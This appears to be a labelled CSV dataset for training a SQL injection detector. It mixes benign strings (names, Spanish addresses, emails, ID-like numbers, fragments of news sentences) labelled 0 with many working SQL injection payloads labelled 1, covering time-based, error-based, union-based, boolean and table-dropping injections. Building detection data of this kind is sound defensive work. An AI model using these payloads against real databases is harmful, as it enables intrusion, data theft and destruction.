Sentence,Label
"1'|| ( select 'bvic' from dual where 4839 = 4839 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5  )  )  ||'",1
walborn@19horas.cat,0
"select * from generate_series ( 1134,1134,case when  ( 1134 = 4909 )  then 1 else 0 end )  limit 1--",1
amabelle,0
terrassa,0
"1%""  )  )   and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  ""%"" = """,1
46844,0
garladora,0
"1'  )  )   )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 'isyg' = 'isyg",1
 or a  =  a,1
7840792716096931,0
197,0
43736,0
"-9725 )  where 9068 = 9068 or elt ( 4723 = 1426,1426 ) --",1
" &quot; We would welcome review CASA allowing use electronic devices really think improve customer experience (wireless in-flight entertainment) planes , &quot; spokesman said ",0
1' )  where 6408 = 6408,1
queila,0
5527948175762743,0
8628176776462777,0
eranio,0
pdf 201704/00001491531280013,0
22212,0
3796618492569421,0
 &quot; We &apos;ve able scrub surgeries help blot blood away hold tools Dr,0
" There agreement whatever variety actions, honest natural hour",0
"1  )  )   as potk where 5040 = 5040 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
3323,0
kirk,0
"-9110""  )  )   union all select 2263,2263,2263,2263,2263#",1
" Ultimately , child decide sex feels comfortable -- &apos;s wonderful thing ",0
1oca,0
"1"" )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and  ( ""liar"" = ""liar",1
 But slight shift age menarche (the first period) past four decades ,0
wilbur,0
lilias,0
"zabalbide, 114,",0
1  )  )   as msug where 3503 = 3503 and sleep ( 5 ) #,1
"-5925 )  where 5758 = 5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1
lizana rom,0
trgono,0
eiji,0
"1' )  and make_set ( 8403 = 8403,8899 ) ",1
1888,0
"1%"" )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""%"" = """,1
79071325q,0
"calle casimiro junco, 140,",0
entrada casas 90,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and  ( 'qomf' like 'qomf",1
serapia,0
5764,0
"-1083' )  union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1
" select * from users where id = 1 -1<@ union select 1,version (  )  -- 1",1
34964894h,0
' ; drop table temp --,1
"1"" )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( ""stcv"" = ""stcv",1
iriyuy,0
"1  )  )   )  or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (   ( 7589 = 7589",1
"plaa llimoner 81,",0
select  ( case when  ( 3076 = 3596 )  then 3076 else 3076* ( select 3076 from mysql.db )  end ) #,1
2657051536857190,0
33455,0
cavall monn,0
ellacott2,0
78532141k,0
"-8238'  )  )   union all select 9797,9797,9797,9797,9797,9797,9797,9797#",1
balcol vizcano,0
nishio@granbretana.com.ml,0
1%' )  rlike sleep ( 5 )  and  ( '%' = ',1
ayen,0
"1 where 4319 = 4319 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
entregadora,0
 The goal adjustment create relaxing atmosphere ,0
" German passports third designation M F -- X , intersex , according Interior Ministry ",0
newall@maletti.zw,0
50490,0
threader,0
1'  )  )   as xirr where 2425 = 2425,1
opaline,0
"calle somontin 154, 3a",0
tesch,0
palenque,0
6113595872626667,0
05248300e,0
1'  )  )   )  and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'cbnc' like 'cbnc,1
benifl,0
42214,0
"1""  )  )   )  and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1
ulls,0
me93a,0
32,0
5e011llo,0
45280,0
" The experience Theresa Rütten , head citizen &apos;s Life Old Age service State Capital , also &apos; majority old people Stuttgart want remain homes long possible &apos; ",0
mediavilla buera,0
30,0
5e3i2a4,0
"1""  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""jzsb"" = ""jzsb",1
5829,0
"calle bruno ayllon, 142, 3?c",0
80788346h,0
vadell comalada,0
 Proceedings initially mainly involved reconstruction series events night crime ,0
zohreh,0
"select * from generate_series ( 9058,9058,case when  ( 9058 = 1183 )  then 1 else 0 end )  limit 1--",1
arda,0
"1  )  )   as rual where 4649 = 4649 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
symon,0
18041890t,0
riudellots de la selva,0
schreife,0
 You wonderful baby enjoy fun ,0
tuneu,0
25320,0
"1  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  8189 = 8189",1
"1' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ",1
doa,0
watts@viajesnacionales.na,0
9473535060757439,0
c/ espiritu santo 126,0
28287163s,0
" For Hans Kammerer , exercise also chance show achieved available staff ",0
80876345l,0
1' )  rlike  ( select  ( case when  ( 7447 = 3981 )  then 1 else 0x28 end  )  )  ,1
puntagorda,0
"1  )  )   as jzzo where 7773 = 7773 union all select null,null,null,null,null#",1
1'  )  )   as vnwn where 8774 = 8774 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
96622444l,0
c/ enrique marias 129,0
" Under new bill , media houses fined 20 million Kenyan shillings individual journalists one million additional risk &quot; de-listed , &quot; barred receiving official press accreditation ",0
9032865306182152,0
villalobar de rioja,0
duilio,0
fetzko,0
" &quot; She added , &quot; That long time ago , &apos;s kind ",0
"1' )  where 2725 = 2725 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
' or '1'  =  '1,1
munch_velazquez@hiperzaragoza.tk,0
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",1
lopiano,0
vitacco,0
"1' )  and elt ( 1407 = 6365,6365 )  and  ( 'zckl' = 'zckl",1
"-6778 )  as xutm where 6442 = 6442 union all select 6442,6442,6442,6442,6442,6442#",1
94430620a,0
c/ oblit 76,0
langa del castillo,0
joan pelliser,0
select  ( case when  ( 2676 = 4191 )  then 2676 else 1/ ( select 0 )  end ) --,1
casas de bentez,0
7611183184008981,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (   ( ""%"" = """,1
zimmerly,0
"rinconada de la sierra, la",0
94,0
"1'  )  )   )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (   ( 'owga' like 'owga",1
80396628j,0
senterada,0
" ( select count ( * )  from generate_series ( 1,5000000  )  )  ",1
1%'  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( '%' = ',1
jaenicke@lamola-hotel.coop,0
"1  )  )   as jfae where 6684 = 6684 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
" ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and  ( ""vjlr"" like ""vjlr",1
calle ramon mario mirazo 46,0
"angel martin puebla 157,",0
caminreal,0
pangborne@europop.mw,0
lesaca clar,0
chunyen,0
bediaga,0
sabiela,0
28782294w,0
mallejac,0
"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ",1
" select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",1
"1%"" or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1
" For time , house longer habitable ",0
sangborivutr@ssextremadura.gr,0
harmnica,0
4l09o636a,0
halpin,0
"1%' and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
lescot,0
spaeth@directoriogratuito.kr,0
jelisic@sevach.pf,0
06044170t,0
"1 union all select null,null,null,null--",1
select  ( case when  ( 8618 = 8706 )  then 8618 else 8618* ( select 8618 from mysql.db )  end ) #,1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --",1
2112641225180222,0
"1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) -- btqa",1
07694,0
dudas@google-movil.np,0
lora de estepa,0
pafilis,0
"1%'  )  )   )  union all select null,null,null,null,null,null,null,null--",1
select case when 7649 = 9297 then 1 else null end--,1
116,0
"1""  )  )   as uycc where 4364 = 4364 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
quan@arroyo-molinos.ee,0
bow@whitepearlresort.pl,0
"plaa zenobia camprubi, 81, 13-d",0
95105299t,0
35715294c,0
aranga,0
pettinge,0
bain@raullazaro.pm,0
borbn bascomta,0
"1"" and  ( 7597 = 8422 ) *8422 and ""gywp"" like ""gywp",1
badri@esmarbella.gs,0
cosmo@vilainstal.sv,0
"c/ pla des monestir 4, 2c",0
 Republic trying fix Frontier &apos;s finances part selling airline ,0
igea,0
12269719r,0
 select * from users where id = '1' + $+%\ or 1 = 1 -- 1',1
"c/ espigo, 0 10h",0
"1'|| ( select 'xbvz' from dual where 1632 = 1632 union all select null,null,null,null,null,null,null,null--",1
ivancevi,0
 end and   (  (   ( 'xzbk' = 'xzbk,1
ezcurra lo cascio,0
saj.ador,0
"-4711' in boolean mode )  union all select 8007,8007,8007,8007,8007,8007--",1
51178304s,0
-2432'  )  )   or  ( 8459 = 8459 ) *4906 and   (  (  'ejhp' = 'ejhp,1
" According police investigations , 67-year-old Wolfsburg resident buried dead mother woods order might continue collect pension care allowance ",0
" If pedestrian presses button traffic lights , top radar sensor checks traffic status ",0
thuong,0
ezequiel,0
"calle de piquer, 8,",0
31744,0
coursdev,0
"da roseira s/n, 7a",0
-7452' or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and 'nmdq' like 'nmdq,1
buchko,0
"c/ fernando vi 79, 1g",0
"c/ iguazu, 109, 8?a",0
danciel,0
enang.ostar,0
marcum3,0
zalzale1,0
muelas del pan,0
-5555  )  )   as ldte where 4583 = 4583 order by 1#,1
astor@caspospas.py,0
arturo,0
"1  )  )   as fmpr where 3103 = 3103 and elt ( 9970 = 9297,9297 ) --",1
derbyshi,0
"1' and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and 'mnbg' like 'mnbg",1
p5nderativa,0
castell de farfanya,0
echarri,0
banda garitacelaya,0
"1""  )  )   )  and make_set ( 8403 = 8403,8899 )  and   (  (   ( ""uisi"" = ""uisi",1
6866,0
"-4728""  )  )   as ndri where 3278 = 3278 or make_set ( 9354 = 9354,7185 ) --",1
ramaje,0
"1"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
doroteya,0
asshole,0
aceituna,0
 Jupiter moons also great interest researchers ,0
"virgen del mayor dolor 188, 11?a",0
-7273%'  )  )   order by 1#,1
1 )  where 1333 = 1333 order by 1--,1
"1'  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( 'sqzl' = 'sqzl",1
boixad delacerda,0
5266363130660418,0
â or 3 = 3 --,1
"1  )  )   union all select null,null,null,null,null,null,null,null,null,null--",1
rolleck@soybueno.mm,0
8656,0
acu7ntiar,0
1 )  where 4992 = 4992,1
1 where 9752 = 9752,1
monzon pinart,0
8231060336250168,0
"fonsagrada, a",0
fla,0
san juan bosco 113 1-d,0
9217704235883409,0
"1"" )  and make_set ( 8403 = 8403,8899 )  and  ( ""dhss"" = ""dhss",1
juornneau@buscadordevideos.cr,0
benicolet,0
"1%""  )  )   )  and 2006 = 2006",1
41713468r,0
carretera de ribadesella a canero 68 10-g,0
" Stevie Rochelle Bamford initially found guilty Phuket provincial court June 15 making false claims telling Thai police local taxi driver , two men restraining , carried assault early hours Sunday June 10 ",0
distinct,1
" During morning , Migration Integration working group also sought continue discussions ",0
roca,0
biosca,0
0683879802529946,0
"5 billion , sued Samsung Electronics Co Ltd , HTC Corp , Huawei four companies patent infringement U",0
-1459'  )  )   )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( 'eiet' like 'eiet,1
" select * from users where id = 1 or "" ( ]"" or 1 = 1 -- 1",1
schmoe,0
 This year became European Champion special discipline ,0
pullman-mcclintock@surcosur.st,0
soldani-godet@informex.ru,0
" &quot; Left , politicians would bankrupt country take us back hunting gathering , &quot; wrote ",0
1' in boolean mode )  and sleep ( 5 ) #,1
cholewin,0
" ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (   ( ""sxih"" = ""sxih",1
boynton4,0
grifell brathwaite,0
carissa,0
witting@videotubo.cl,0
50408,0
"1' )  as tygi where 9891 = 9891 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1
"1'+ ( select aahc where 5436 = 5436 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) +'",1
select  ( case when  ( 1961 = 2048 )  then 1961 else 1961* ( select 1961 from information_schema.character_sets )  end ) #,1
17800,0
"-1059"" )  union all select 1276,1276,1276,1276,1276,1276,1276,1276#",1
castaldi.grasselli@expofloralzaragoza2014.pf,0
79144797a,0
"1%""  )  )   union all select null,null#",1
"1'+ ( select uzan where 4312 = 4312 and make_set ( 3129 = 9555,9555  )  )  +'",1
pertusa boladera,0
"camino del caliero, 75",0
kristiansen-fineschi@bijoubijoudiferente.cl,0
" On Saturday 26 October , exceptional mass heard 7",0
aeriel,0
-1769 union all select 6054--,1
armijo,0
19482682a,0
ro3eral,0
"5%) experiencing uptick , according research Savills ",0
argecilla,0
1 )  where 9860 = 9860 and 4443 = 4111--,1
42361844f,0
"1 or elt ( 6272 = 6272,sleep ( 5  )  )  ",1
kerber frola,0
08686877f,0
59529079l,0
"1' )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1
09251630h,0
champ,0
"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",1
"-4015"" where 2610 = 2610 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
"1%""  )  )   )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
mio de san esteban,0
"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (   ( 5324 = 5324",1
 The intercepted conversations characterised high level aggression ,0
19210,0
38,0
71543641w,0
20120,0
"1  )  )   )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (   ( 4510 = 4510",1
calle jose lopez tafall 192,0
wanisko_hoover@tradora.td,0
 &quot; The CEO said accept staff &apos;s evidence uncomfortable reporting upwards managers ,0
"1"" or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and ""kins"" = ""kins",1
russo,0
34449,0
macedonia 48,0
acomplexionada,0
giribet armisn,0
"avinguda guix borrull 170,",0
11693,0
27654,0
" The new carry-on fee bags overhead bin , small bags seat still free ",0
"1"" rlike sleep ( 5 )  and ""rylv"" like ""rylv",1
dlar,0
"1%' )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( '%' = '",1
7ed1l,0
"1"" )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
3820743619643877,0
36815dat1ra,0
pompeyo,0
"1"" )  as vdim where 1296 = 1296",1
1' where 7191 = 7191 rlike sleep ( 5 ) --,1
8866,0
"-3960""  )  )   union all select 7813,7813,7813,7813,7813,7813--",1
7r6d54ti450,0
cabarrs zafn,0
20048048y,0
9162334723875086,0
6687072478385848,0
"-6333""  )  )   )  union all select 9851,9851,9851,9851,9851,9851--",1
"1"" where 3318 = 3318",1
1' in boolean mode )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) #,1
regueras de arriba,0
1  )  )   as qlkf where 6635 = 6635,1
sonsoles,0
"-1236'+ ( select 'fbgh' where 3896 = 3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",1
a6r91n4,0
maughan@enfuerteventura.com.rw,0
bowen-gugolka@soyriojano.name,0
"1%' )  union all select null,null,null,null,null#",1
temprano canavoso,0
autonell,0
"1'  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( 'jwbt' = 'jwbt",1
85624451m,0
"1%' and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and '%' = '",1
sanlcar la mayor,0
"-1337"" )  union all select 7508--",1
"calle doctor bove, 65",0
calle lovaina s/n 7e,0
-1714' union all select 6687--,1
augusto,0
montfort fiuza,0
 Pam &apos;s blonde locks made famous role sexy TV show Baywatch ,0
kowalska@carmensanmartin.uz,0
"select sleep ( 5 )  and   (  (   ( ""wucy"" like ""wucy",1
guayabo,0
1 )  as iknl where 3885 = 3885 rlike sleep ( 5 ) #,1
6341819669963492,0
""" or """" """,1
griffith,0
-4262%'  )  )   )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( '%' = ',1
drohocka@baybay.mq,0
1%'  )  )   and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  '%' = ',1
isidoro,0
llompart maydana,0
"1""  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #",1
famery@noticiasenvivo.ie,0
1889610781907232,0
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""fqeu"" like ""fqeu",1
1'|| ( select 'znba' where 8323 = 8323,1
"calle roger de lauria, 4",0
1834523414581384,0
04277567g,0
marika@tuslimites.mp,0
"1' )  as yjdg where 5262 = 5262 union all select null,null,null#",1
1272,0
 I hope sees I ,0
4811965033503576,0
1 where 7516 = 7516 union all select null#,1
"1  )  )   as cdhd where 2958 = 2958 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
clavel,0
hollywood.hausman@921.th,0
stadler_munks@chevrolet-volt.at,0
"juan de mariana, 150,",0
litago,0
"-3063%""  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( ""%"" = """,1
" The area filled nondescript warehouses , making easier conceal trucks loaded drugs ",0
1'|| ( select 'xdzp' from dual where 5786 = 5786 and  ( 3020 = 3020 ) *6703 ) ||',1
"1' )  where 8125 = 8125 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1
3andador4,0
51942267x,0
" She daughter former Australian league player Peter Tunks , appealed Department Foreign Affairs Canberra assist daughter ",0
"1  )  )   as midl where 9046 = 9046 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1
"calle la rambla de el saler, 25",0
beda,0
"1' )  as fxuk where 6184 = 6184 and make_set ( 9292 = 2785,2785 ) --",1
 None traders accused wrongdoing ,0
78153384m,0
c/ marroquina 16 10?c,0
61621455q,0
 I suspect Scotland could well inside looser European arrangement provided kept currency ,0
67242195q,0
8781173513237509,0
95328463h,0
"-8841%"" )  or 4361 = 1910",1
"-3566' where 3641 = 3641 union all select 3641,3641,3641,3641,3641#",1
"-5761"" )  or 3762 = 1274",1
dionysia,0
29763219t,0
talens zumalacrregui,0
" Rainer Prewo , former Lord Mayor Nagold , made suggestion equipping vehicle photovoltaic system , according Henne , planning assume advisory role within organisation ",0
25727,0
argelita,0
obn,0
tanchak,0
villanueva de las cruces,0
mirambell donet,0
"1"" )  as rbgl where 3822 = 3822 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",1
handy.leleu@chevrolet-volt.gob,0
1' )  and 2564 = 3234--,1
"gravina, 78",0
haslund@arvigar.sl,0
"1%"" )  procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
1  )  )   waitfor delay '0:0:5' and   (  (  1636 = 1636,1
"1 )  where 2720 = 2720 and elt ( 4249 = 4249,7259 ) --",1
"1 )  as auly where 4146 = 4146 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
macuare ribes,0
agelet grenett,0
barco montull,0
" They &quot; provided us many question marks , seem lost exclamation marks &quot; ",0
praza da constitucion 162,0
martn miguel,0
operalo@canovash.vg,0
"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",1
" &quot; We receiving 500 people trip , &quot; Bwelle said ",0
 select sleep ( 5 ) --,1
08695,0
kussauer_brereton@showcarsmadrid.com.kp,0
3303,0
" &quot; Mr Ditta accused abusing position criminal solicitor , become involved specific clients ",0
"-3769""  )  )   )  union all select 8456#",1
 &quot; He became first high-ranking member U,0
admin' or ',1
"pl. de monteleon 60,",0
"1' )  where 4786 = 4786 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
poma bolet,0
40142181m,0
crosswel,0
tajamar,0
"1"" where 7279 = 7279 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
gingeric,0
34839,0
6537476325760255,0
hiller,0
arguis,0
"1' )  where 7646 = 7646 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
cecon5,0
baquet0,0
"1' or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and 'aezm' like 'aezm",1
povedilla,0
6608r.lo2uo,0
"c/ dueas 100,",0
plutarco,0
42ec0sei1a1a,0
aguilar de bureba,0
miramon@logiteclines.rs,0
solana,0
"-4091""  )  )   )  union all select 6694,6694--",1
" &quot; This tax going black hole , &quot; said Adrian Moore , vice president policy Reason ",0
" &quot; New voices love sing welcome time , &quot; said Schlotmann ",0
 She right middle cliff face - 50ft top bottom ,0
freiwald1,0
shiomi@errebebe.ug,0
7665578374246731,0
corulln,0
cruz,0
pires arajol,0
" If , 18 years old , I supposed figure governance may contradict political campaigns precede ",0
1' where 1652 = 1652 and sleep ( 5 ) #,1
"1 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) -- wvjy",1
uncastillo,0
"-7514%""  )  )   )  or 2448 = 8797#",1
"-7333%""  )  )   )  or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( ""%"" = """,1
"1"" )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""piya"" = ""piya",1
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and   (  (   ( 9348 = 9348",1
